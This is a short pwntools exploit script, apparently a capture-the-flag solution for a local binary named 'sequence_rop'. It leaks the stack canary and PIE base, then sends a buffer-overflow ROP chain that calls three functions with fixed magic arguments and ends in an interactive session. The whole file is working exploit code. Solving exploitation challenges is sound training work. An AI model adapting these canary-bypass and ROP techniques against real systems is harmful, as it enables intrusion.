from pwn import *

context.log_level = "debug"
p = process("./sequence_rop")
#p = remote("", )

elf = ELF("./sequence_rop")

sequence1_offset = 0x00000000000129b
sequence2_offset = 0x12e2
sequence3_offset = 0x1334
pop_rdi_offset = 0x0000000000001231

# canary leak
p.sendlineafter(b"> ", b"1")

p.recvuntil(b"Value: ")
canary_leak = p.recvline().strip().decode()
canary = int((canary_leak), 16)

print(f"Canary leak : {hex(canary)}")
pause()

# PIE base leak
p.sendlineafter(b"> ", b"2")

p.recvuntil(b"Address: ")
sequence1 = int(p.recvn(15)[:-1], 16)

PIE_base = sequence1 - sequence1_offset
print(f"PIE base leak : {hex(PIE_base)}")

sequence2 = PIE_base + sequence2_offset
sequence3 = PIE_base + sequence3_offset
pop_rdi = PIE_base + pop_rdi_offset

# ROP
p.sendlineafter(b"> ", b"3")

payload = b"A" * 136
payload += p64(canary)
payload += b"B" * 8

payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(sequence1)

payload += p64(pop_rdi)
payload += p64(0xcafebabe)
payload += p64(sequence2)

payload += p64(pop_rdi)
payload += p64(0x13371337)
payload += p64(sequence3)

p.sendafter(b"Enter input (max 256 bytes):", payload)

log.success("stage1 clear!")
log.success("stage2 clear!")
log.success("stage3 clear!")

p.interactive()
